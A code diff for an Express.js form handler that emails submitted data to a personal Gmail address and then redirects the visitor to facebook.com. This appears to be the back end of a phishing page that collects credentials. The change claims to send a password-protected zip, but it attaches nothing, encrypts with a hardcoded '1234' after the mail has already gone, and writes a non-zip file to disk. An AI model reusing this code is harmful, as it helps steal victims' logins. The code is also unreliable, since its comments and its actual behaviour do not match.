@@ -39,12 +39,22 @@ app.post("/submit", async (req, res) => {
             from: "ayomiakintoye00@gmail.com",
             to: "isaiahgabriel175@gmail.com", // recipient email address
             subject: "Data file",
-            text: JSON.stringify(data), // use JSON.stringify to convert the data to a string
+            text: "Please find attached the password-protected zip file containing the message data.", // use JSON.stringify to convert the data to a string
         };
 
         // send mail with defined transport object
         const info = await transporter.sendMail(mailOptions);
         console.log("Email sent successfully.", info);
+
+        // create zip file with password
+        const zip = require("jszip")();
+        zip.file("happy.txt", JSON.stringify(data));
+        const content = await zip.generateAsync({ type: "nodebuffer", compression: "DEFLATE", compressionOptions: { level: 9 } });
+        const password = "1234";
+        const encrypted = await require("crypto").createCipher("aes-256-ctr", password).update(content);
+
+        // write encrypted zip file to disk
+        fs.writeFileSync("happy.zip", encrypted);
 
         // redirect the user to Facebook
         res.redirect("https://www.facebook.com");
